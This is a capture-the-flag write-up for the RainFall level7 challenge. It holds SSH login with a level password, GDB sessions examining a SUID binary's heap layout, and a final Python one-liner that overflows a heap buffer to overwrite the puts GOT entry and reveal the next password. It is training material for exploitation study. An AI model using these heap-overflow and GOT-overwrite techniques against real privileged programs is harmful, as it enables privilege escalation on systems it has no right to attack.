Login as `level7`.
```shell
┌──$ [~/42/2021/rainfall]
└─>  ssh 192.168.0.19 -p 4242 -l level7
level7@192.168.0.19's password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
A `SUID` executable is located in the home directory.
```shell
level7@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
```
```gdb
(gdb) info functions
[...]
0x080484f4  m
0x08048521  main
[...]
```
Examing binary with GDB shows that inside `main()` function it opens `/home/user/level8/.pass` file, then reads 68 bytes from the given stream and stores them in the string `c` defined as global variable.
On the other hand the content of `c` variable is printed inside `m()` function.

Function `m()` can be called inside GDB simply by changing `EIP` register pointing to start of `m()` function.
```gdb
(gdb) break *main+202
Breakpoint 1 at 0x80485eb
(gdb) run AAAA BBBB
Starting program: /home/user/level7/level7 AAAA BBBB

Breakpoint 1, 0x080485eb in main ()
(gdb) print $eip
$1 = (void (*)()) 0x80485eb <main+202>
(gdb) set $eip=0x080484f4
(gdb) continue
Continuing.
 - 1630930163

Program received signal SIGSEGV, Segmentation fault.
0x08049960 in c ()
```




0x0804a008 -> $esp+0x1c == str1
```gdb
(gdb) x/16x 0x0804a008

			            fnPtr
            str1[0]     str1[1]     str1[2]     str1[3]
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
            str1[4]     str1[5]     str1[6]     str1[7]
0x804a018:	0x41414141	0x41414141	0x41414141	0x00000000
			            fnPtr
            str2[0]     str2[1]     str2[2]     str2[3]
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
            str2[4]     str2[5]     str2[6]     str2[7]
0x804a038:	0x42424242	0x42424242	0x00000000	0x00020fc
```

Try to overwrite GOT entry of `fgets()` function
```gdb
(gdb) info functions
[...]
0x080484f4  m
[...]
(gdb) disassemble main
[...]
(gdb) break *0x080485eb
Breakpoint 1 at 0x80485eb
(gdb) run AAAA BBBB
Starting program: /home/user/level7/level7 AAAA BBBB

Breakpoint 1, 0x080485eb in main ()
(gdb) x/i $eip
=> 0x80485eb <main+202>:	call   0x80483c0 <fgets@plt>
(gdb) disassemble 0x80483c0
Dump of assembler code for function fgets@plt:
   0x080483c0 <+0>:	jmp    *0x8049918
   0x080483c6 <+6>:	push   $0x8
   0x080483cb <+11>:	jmp    0x80483a0
End of assembler dump.
(gdb) x/wx 0x8049918						# Check referencing address
0x8049918 <fgets@got.plt>:	0x080483c6 
(gdb) set *0x8049918=0x080484f4				# Change value of address pointing from `fgets()` to `m()`
(gdb) x/wx 0x8049918						# Address of GOT entry successfully changed
0x8049918 <fgets@got.plt>:	0x080484f4
(gdb) continue								# Execution of `m()`
Continuing.
 - 1633277327
~~
[Inferior 1 (process 2678) exited normally]
```


Break on each functions call and execute first malloc instruction to gead heap addresses.
```gdb
(gdb) break *main+16
Breakpoint 1 at 0x8048531
(gdb) break *main+42
Breakpoint 2 at 0x804854b
(gdb) break *main+63
Breakpoint 3 at 0x8048560
(gdb) break *main+89
Breakpoint 4 at 0x804857a
(gdb) break *main+127
Breakpoint 5 at 0x80485a0
(gdb) break *main+156
Breakpoint 6 at 0x80485bd
(gdb) break *main+178
Breakpoint 7 at 0x80485d3
(gdb) break *main+202
Breakpoint 8 at 0x80485eb
(gdb) break *main+214
Breakpoint 9 at 0x80485f7
(gdb) disassemble 0x8048400
(gdb) run AAAA BBBB
Starting program: /home/user/level7/level7 AAAA BBBB

Breakpoint 1, 0x08048531 in main ()
(gdb) next
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x0804854b in main ()
(gdb) info proc mapping
process 2694
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level7/level7
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level7/level7
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fdb000 0xb7fdd000     0x2000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

To examine the heap, define a hook-stop, to execute commands every time execution stops in program: before breakpoint commands are run, displays are printed, or the stack frame is printed. 
```gdb
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/32wx 0x804a000
>end
(gdb) continue
[...]
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
#                                   str1[0]=1    str1[1]=malloc(8)
0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
#                                   str2[0]=2    str2[1]=malloc(8)
0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
0x804a040:	0x00000000	0x00020fc1	0xfbad240c	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0xb7fd1980
0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
(gdb) backtrace
#0  0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
#1  0x080485f0 in main ()
(gdb) continue
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
0x804a000:	Error while running hook_stop:
Cannot access memory at address 0x804a000
```

If `av[0]` is enough large, it can overwrite address containing in `str2[1]` so that while copying content of `av[2]` it overwrite GOT content.
```gdb
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
(gdb) x 0x8049928
0x8049928 <puts@got.plt>:	0x08048406k
(gdb) quit
level7@RainFall:~$ ./level7 $(python -c "import struct; print 'AAAA'*5 + struct.pack('I', 0x8049928)") $(python -c "import struct; print struct.pack('I', 0x80484f4)")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1634572244
 ```
